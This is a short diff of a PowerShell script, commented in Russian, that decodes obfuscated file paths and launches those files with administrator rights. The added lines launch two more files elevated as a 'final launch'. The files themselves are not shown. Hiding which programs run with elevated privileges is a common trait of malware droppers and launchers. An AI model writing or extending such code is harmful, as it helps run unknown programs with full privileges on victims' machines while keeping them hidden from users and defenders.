@@ -124,3 +124,7 @@ $decodedPath2 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath2)
 # Запуск файлов с обфусцированными путями от имени администратора
 Start-Process -FilePath $decodedPath1 -Verb RunAs
 Start-Process -FilePath $decodedPath2 -Verb RunAs
+
+# Завершающий запуск для всех файлов
+Start-Process -FilePath $file1 -Verb RunAs
+Start-Process -FilePath $file2 -Verb RunAs
